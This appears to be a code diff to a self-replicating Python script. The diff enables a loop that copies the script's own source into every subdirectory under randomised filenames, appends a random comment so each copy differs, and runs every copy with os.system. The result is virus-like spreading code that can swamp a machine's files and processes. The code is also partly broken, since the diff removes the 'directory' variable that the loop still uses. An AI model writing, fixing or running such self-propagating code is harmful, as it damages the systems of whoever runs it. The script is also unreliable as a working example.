@@ -15,6 +15,8 @@ from threading import Thread
 import sys
 import random
 import string
+#directory = os.getcwd()
+#print("this is whre I am " + directory)
 
 def writeIntoFile(file, lines):
     count = len(lines)
@@ -35,17 +37,17 @@ def previousFolder(file, lines):
         if start == (count - 1):
             break
         file.write(line)
-        if start == 1: 
-            file.write(os.chdir('../'))
+        if start == 14:
+            file.write("\nos.chdir('../')\n")
 
 def runFunc(filename):
     os.system('python3 ' + filename)
 
 #get the current file
 thisfile = os.path.basename(__file__)
-directory = os.getcwd()
 
-print(directory)
+
+
 
 #open up the file and read it
 f = open(thisfile, "r")
@@ -56,21 +58,25 @@ f.close()
 filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
 #start copying the contents of the files to the new one
-h = open("..\\" + filename, "w")
-previousFolder(h, lines)
-h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-h.close()
+#if os.access("..\\", os.W_OK):
+#    print("..\\" + filename)
+#    h = open("..\\" + filename, "w")
+#    previousFolder(h, lines)
+#    h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+#    h.close()
+#    if os.path.isfile("..\\" + filename):
+#        thread = Thread(target=runFunc("..\\" + filename))
+#        thread.start()
 
-#for x in os.walk(directory):
-#    g = open(x[0] + "/" + filename, "w")
-#    writeIntoFile(g, lines)
-#    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-#    g.close()
-#    thread = Thread(target=runFunc(x[0] + "/" + filename))
-#    thread.start()
+for x in os.walk(directory):
+    g = open(x[0] + "/" + filename, "w")
+    writeIntoFile(g, lines)
+    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+    g.close()
+    thread = Thread(target=runFunc(x[0] + "/" + filename))
+    thread.start()
 
-thread = Thread(target=runFunc("..\\" + filename))
-thread.start()
+
 
 #Ensure this thread gets closed
 sys.exit()
